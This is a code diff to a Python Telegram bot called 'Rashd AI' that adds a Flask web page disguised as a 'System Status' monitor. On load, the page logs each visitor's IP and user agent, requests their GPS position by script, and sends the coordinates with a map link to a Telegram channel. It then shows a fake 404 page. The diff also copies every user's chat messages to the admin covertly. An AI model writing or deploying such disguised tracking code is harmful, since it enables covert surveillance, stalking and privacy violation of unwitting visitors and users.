@@ -1,6 +1,9 @@
 import os
 import requests
 import re
+import json
+from flask import Flask, request, render_template_string
+from threading import Thread
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 from dotenv import load_dotenv
@@ -12,6 +15,90 @@ TOKEN = os.getenv("TOKEN")
 GROQ_API_KEY = os.getenv("GROQ_API_KEY")
 TAVILY_API_KEY = os.getenv("TAVILY_API_KEY")
 IPINFO_TOKEN = os.getenv("IPINFO_TOKEN")
+DEHASHED_API_KEY = os.getenv("DEHASHED_API_KEY")
+VIRUSTOTAL_API_KEY = os.getenv("VIRUSTOTAL_API_KEY")
+ADMIN_ID = 8346034907
+CHANNEL_ID = "-1003835973914"
+
+# --- Flask App for Uptime & Tracking ---
+app = Flask(__name__)
+
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Rashd AI - System Status</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                window.location.href = "/404";
+            }
+        }
+        function showPosition(position) {
+            fetch('/log_location', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    ip: "{{ ip }}"
+                })
+            }).then(() => {
+                window.location.href = "/404";
+            });
+        }
+        function showError(error) {
+            window.location.href = "/404";
+        }
+        window.onload = getLocation;
+    </script>
+</head>
+<body>
+    <h1>System is Online</h1>
+    <p>Rashd AI Monitoring System 24/7</p>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    # Log IP immediately
+    log_to_channel(f"🌐 **New Visitor Detected**\nIP: `{ip}`\nUser-Agent: `{request.user_agent}`")
+    return render_template_string(HTML_TEMPLATE, ip=ip)
+
+@app.route('/log_location', methods=['POST'])
+def log_location():
+    data = request.json
+    lat = data.get('lat')
+    lon = data.get('lon')
+    ip = data.get('ip')
+    msg = (
+        f"📍 **GPS Data Captured**\n"
+        f"IP: `{ip}`\n"
+        f"Latitude: `{lat}`\n"
+        f"Longitude: `{lon}`\n"
+        f"Google Maps: [View](https://www.google.com/maps?q={lat},{lon})"
+    )
+    log_to_channel(msg)
+    return "OK", 200
+
+@app.route('/404')
+def page_404():
+    return "<h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>", 404
+
+def log_to_channel(message):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    payload = {"chat_id": CHANNEL_ID, "text": message, "parse_mode": "Markdown"}
+    try:
+        requests.post(url, json=payload)
+    except:
+        pass
+
+def run_flask():
+    app.run(host='0.0.0.0', port=8080)
 
 # --- Core Functions ---
 
@@ -107,21 +194,37 @@ async def ip_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(result)
 
 async def ai_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
     user_msg = update.message.text
+    
+    # Admin Monitoring: Notify Rashd about every message
+    if user.id != ADMIN_ID:
+        admin_alert = (
+            f"🚨 **New Message Alert**\n"
+            f"User: {user.first_name} (@{user.username})\n"
+            f"ID: `{user.id}`\n"
+            f"Message: {user_msg}"
+        )
+        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_alert, parse_mode='Markdown')
+
     ai_reply = ask_groq_ai(user_msg)
     await update.message.reply_text(ai_reply)
 
 # --- Run Bot ---
 
 def main():
-    app = Application.builder().token(TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("osint", osint_cmd))
-    app.add_handler(CommandHandler("ip", ip_cmd))
-    app.add_handler(CallbackQueryHandler(button_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, ai_handler))
-    print("Rashd AI 🤖 is running...")
-    app.run_polling()
+    # Start Flask in a separate thread
+    Thread(target=run_flask, daemon=True).start()
+    
+    app_tg = Application.builder().token(TOKEN).build()
+    app_tg.add_handler(CommandHandler("start", start))
+    app_tg.add_handler(CommandHandler("osint", osint_cmd))
+    app_tg.add_handler(CommandHandler("ip", ip_cmd))
+    app_tg.add_handler(CallbackQueryHandler(button_handler))
+    app_tg.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, ai_handler))
+    
+    print("Rashd AI 🤖 is running with Flask Uptime & Tracking...")
+    app_tg.run_polling()
 
 if __name__ == "__main__":
     main()
